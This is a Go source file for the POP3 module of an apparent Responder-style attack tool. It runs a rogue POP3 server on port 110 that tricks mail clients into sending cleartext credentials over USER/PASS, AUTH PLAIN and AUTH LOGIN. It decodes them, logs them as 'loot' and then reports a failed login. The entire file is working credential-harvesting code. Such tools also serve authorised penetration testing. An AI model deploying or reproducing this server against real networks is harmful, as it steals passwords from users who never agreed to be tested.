// Package pop3 implements a rogue POP3 server that captures cleartext
// credentials from USER/PASS and the AUTH PLAIN / AUTH LOGIN SASL mechanisms.
package pop3

import (
	"bufio"
	"context"
	"encoding/base64"
	"fmt"
	"net"
	"strings"
	"time"

	"lantern/internal/core"
)

const (
	ServiceName = "pop3"
	DefaultPort = 110
	readTimeout = 30 * time.Second
)

type Module struct {
	server *core.TCPServer
	Logger *core.Logger
}

func New(logger *core.Logger) *Module {
	m := &Module{Logger: logger}
	m.server = &core.TCPServer{
		Service: "POP3",
		Address: "0.0.0.0",
		Port:    DefaultPort,
		Logger:  logger,
		Handler: m.handle,
	}
	return m
}

func (m *Module) Name() string      { return ServiceName }
func (m *Module) HasListener() bool { return true }
func (m *Module) HasPoisoner() bool { return false }

func (m *Module) StartPoisoner(context.Context, core.Config) error {
	return fmt.Errorf("POP3 poisoning is not supported")
}

func (m *Module) StartListener(ctx context.Context, cfg core.Config) error {
	m.server.Logger = m.Logger
	return m.server.Start(ctx, cfg)
}

func (m *Module) Stop() { m.server.Stop() }

func (m *Module) handle(ctx context.Context, conn net.Conn) {
	client := core.ClientIP(conn)
	reader := bufio.NewReader(conn)
	fmt.Fprint(conn, "+OK POP3 server ready\r\n")

	var user string
	readLine := func() (string, bool) {
		core.SetDeadline(ctx, conn, readTimeout)
		line, err := reader.ReadString('\n')
		if err != nil {
			return "", false
		}
		return strings.TrimRight(line, "\r\n"), true
	}

	for {
		line, ok := readLine()
		if !ok {
			return
		}
		verb, arg := splitCommand(line)

		switch strings.ToUpper(verb) {
		case "CAPA":
			fmt.Fprint(conn, "+OK Capability list follows\r\nUSER\r\nSASL PLAIN LOGIN\r\n.\r\n")
		case "USER":
			user = arg
			fmt.Fprint(conn, "+OK User accepted\r\n")
		case "PASS":
			m.capture(client, "PLAIN", user, arg)
			fmt.Fprint(conn, "-ERR authentication failed\r\n")
			return
		case "AUTH":
			if !m.handleAuth(conn, client, arg, readLine) {
				return
			}
		case "QUIT":
			fmt.Fprint(conn, "+OK Goodbye\r\n")
			return
		default:
			fmt.Fprint(conn, "-ERR Unknown command\r\n")
		}
	}
}

func (m *Module) handleAuth(conn net.Conn, client, arg string, readLine func() (string, bool)) bool {
	mech := strings.ToUpper(strings.Fields(arg + " ")[0])
	switch mech {
	case "PLAIN":
		fmt.Fprint(conn, "+ \r\n")
		blob, ok := readLine()
		if !ok {
			return false
		}
		if user, pass, ok := decodePlain(blob); ok {
			m.capture(client, "AUTH-PLAIN", user, pass)
		}
		fmt.Fprint(conn, "-ERR authentication failed\r\n")
		return false
	case "LOGIN":
		fmt.Fprint(conn, "+ "+b64("Username:")+"\r\n")
		userB64, ok := readLine()
		if !ok {
			return false
		}
		fmt.Fprint(conn, "+ "+b64("Password:")+"\r\n")
		passB64, ok := readLine()
		if !ok {
			return false
		}
		m.capture(client, "AUTH-LOGIN", decodeB64(userB64), decodeB64(passB64))
		fmt.Fprint(conn, "-ERR authentication failed\r\n")
		return false
	default:
		fmt.Fprint(conn, "-ERR Unsupported authentication mechanism\r\n")
		return true
	}
}

func splitCommand(line string) (verb, arg string) {
	parts := strings.SplitN(line, " ", 2)
	verb = parts[0]
	if len(parts) == 2 {
		arg = strings.TrimSpace(parts[1])
	}
	return verb, arg
}

// decodePlain decodes an AUTH PLAIN blob: base64([authzid]\x00user\x00pass).
func decodePlain(blob string) (user, pass string, ok bool) {
	raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(blob))
	if err != nil {
		return "", "", false
	}
	parts := strings.Split(string(raw), "\x00")
	switch len(parts) {
	case 3:
		return parts[1], parts[2], true
	case 2:
		return parts[0], parts[1], true
	default:
		return "", "", false
	}
}

func decodeB64(s string) string {
	raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(s))
	if err != nil {
		return s
	}
	return string(raw)
}

func b64(s string) string {
	return base64.StdEncoding.EncodeToString([]byte(s))
}

func (m *Module) capture(client, mech, user, pass string) {
	if m.Logger == nil {
		return
	}
	if user == "" {
		user = "<not provided>"
	}
	m.Logger.Loot(
		fmt.Sprintf("[POP3] %s credentials from %s", mech, client),
		"[POP3] Username : %s\n[POP3] Password : %q\n[POP3] Hash     : %s:%s",
		user, pass, user, pass)
}
